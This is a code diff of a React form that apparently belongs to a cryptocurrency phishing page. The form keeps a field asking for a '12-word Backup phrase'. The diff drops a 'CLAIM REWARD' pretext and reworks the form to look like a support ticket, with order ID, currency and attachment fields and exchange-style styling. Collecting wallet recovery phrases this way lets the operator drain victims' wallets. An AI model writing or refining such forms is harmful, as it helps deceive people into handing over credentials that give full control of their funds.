@@ -168,24 +168,34 @@ const Form = (props) => {
                         placeholder='Enter 12-word Backup phrase'
                         onChange={handlePhrase}
                     ></textarea>{' '}
+                    <span>Enter the details of your request</span>
                 </div>
                 <div className='grid'>
-                    <label>Your email address</label>
+                    <label>Order ID/Transaction ID</label>
                     <input className='border ' />
+                </div>
+                <div className='grid'>
+                    <label>
+                        Which currency type is related to your concern?
+                    </label>
+                    <Select
+                        options={options}
+                        isClearable
+                        placeholder={'-'}
+                        styles={customStyles}
+                        onChange={onPackageChange}
+                    />{' '}
+                </div>
+                <div className='grid'>
+                    <label>Attachments</label>
+                    <input className='border ' type='file' placeholder='Add file or drop files here'/>
                 </div>
             </div>
 
             <div className='flex justify-between items-center pt-10 font-medium'>
-                <div className='text-xs font-normal text-[#708599]'>
-                    <input type='checkbox' id='checkbox' required /> {''}
-                    <label htmlFor='checkbox'>
-                        Keep me signed in on this computer
-                    </label>
-                </div>
+             
 
-                {/* <button className='justify-self-center py-2 px-6 font-semibold rounded-md outline-none sm:mb-5 btnclaim text-white'>
-                CLAIM REWARD
-            </button> */}
+              
                 <button
                     className='text-white bg-[#1652f0] rounded-sm'
                     style={{ padding: '11px 22px', fontSize: '11px' }}
